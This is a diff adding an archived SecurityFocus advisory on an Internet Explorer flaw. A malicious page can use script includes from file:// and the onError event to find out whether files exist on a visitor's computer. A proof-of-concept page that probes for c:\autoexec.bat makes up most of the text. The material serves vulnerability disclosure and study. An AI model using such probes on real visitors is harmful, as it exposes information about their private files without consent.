@@ -1,0 +1,33 @@
+source: http://www.securityfocus.com/bid/3779/info
+
+Microsoft Internet Explorer is prone to a vulnerability which may disclose sensitive information to a malicious webmaster.
+
+When script code includes a file outside of the document it is embedded in and the file does not exist, the onError event handler will run script if it is enabled. This script can determine whether the file to be included exists or not. This can be used to verify the existence of files on client hosts by creating webpages that include files from the local host using 'file://'. 
+
+<html>
+<head>
+<script language="javascript">
+<!--
+var fileExists = false;
+function yes()
+{
+alert("the file exists.");
+yes = true;
+}
+
+function no()
+{
+if(!fileExists)
+{
+alert("the file does not exist.");
+}
+}
+
+window.onerror = yes
+window.onload = no
+//-->
+</script>
+<script language="javascript"
+src="file://c:\autoexec.bat"></script>
+</head>
+</html>
